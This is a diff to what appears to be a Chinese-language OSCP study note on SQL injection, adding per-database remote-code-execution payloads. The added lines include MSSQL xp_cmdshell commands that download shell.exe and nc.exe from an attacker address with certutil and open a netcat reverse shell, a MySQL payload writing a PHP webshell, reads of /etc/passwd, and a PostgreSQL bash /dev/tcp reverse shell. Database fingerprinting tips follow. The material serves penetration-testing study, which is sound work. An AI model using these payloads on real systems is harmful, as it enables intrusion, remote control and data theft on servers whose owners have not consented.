@@ -206,6 +206,8 @@ date: 2024-02-07
   ' UNION SELECT 1,2,3-- -
   '; EXEC xp_cmdshell('whoami')-- -      -- RCE！
   '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
+  ';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.195/shell.exe c:/temp/shell.exe';--
+  ';exec xp_cmdshell 'c:/temp/shell.exe';--
 
   -- stacked query (MSSQL專用)
   '; WAITFOR DELAY '0:0:5'--
@@ -216,6 +218,69 @@ date: 2024-02-07
   ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
   '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
   ```
+- 各資料庫 RCE Payload
+  - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
+
+    ```sql
+    -- 啟用 xp_cmdshell
+    $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
+
+    -- 執行命令
+    $ '; EXEC xp_cmdshell 'whoami'; --
+
+    -- Reverse shell
+    $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
+    $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
+    ```
+
+  - MySQL(INTO OUTFILE / UDF): FILE 權限 + secure_file_priv 沒有限制 + 知道 web 目錄絕對路徑
+
+    ```sql
+    -- 寫 webshell（需要知道 web 根目錄路徑）
+    $ ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -
+
+    -- 讀檔案
+    $ ' UNION SELECT LOAD_FILE('/etc/passwd') -- -
+    ```
+
+  - PostgreSQL(COPY TO / Large Objects): 需要 superuser 權限。COPY TO PROGRAM 是 PostgreSQL 最強的 RCE 方法。
+
+    ```sql
+    -- 執行命令（9.3+）
+    $ '; COPY (SELECT '') TO PROGRAM 'id'; --
+
+    -- Reverse shell
+    $ '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI_IP/443 0>&1"'; --
+
+    -- 讀檔案
+    $ '; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; --
+    ```
+
+  - Oracle(Java Stored Procedures): 條件很複雜，OSCP 幾乎不考。
+    ```sql
+    -- 透過 Java 執行命令（需要 DBA 權限 + Java 已安裝）
+    CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
+    import java.io.*; import java.lang.*;
+    public class cmd {
+      public static String exec(String args) throws Exception {
+        // ... 執行系統命令
+      }
+    };
+    ```
+  - SQLite: 本身沒有內建 RCE 能力。唯一的方式是 load_extension()，但幾乎所有環境都預設禁用。主要用於讀資料。
+
+- 判斷使用哪個 Database
+  - 從端口推斷：
+    - 1433: MSSQL
+    - 3306: MySQL
+    - 5432: PostgreSQL
+    - 1521: Oracle
+    - 無特定端口(嵌入式): SQLite
+  - 從錯誤訊息判斷：
+    - Microsoft SQL Server / ODBC SQL Server Driver → MSSQL
+    - You have an error in your SQL syntax... MySQL → MySQL
+    - PSQLException / ERROR: syntax error at or near → PostgreSQL
+    - ORA-xxxxx → Oracle
 
 ##### 如何使用 SQLMAP
 
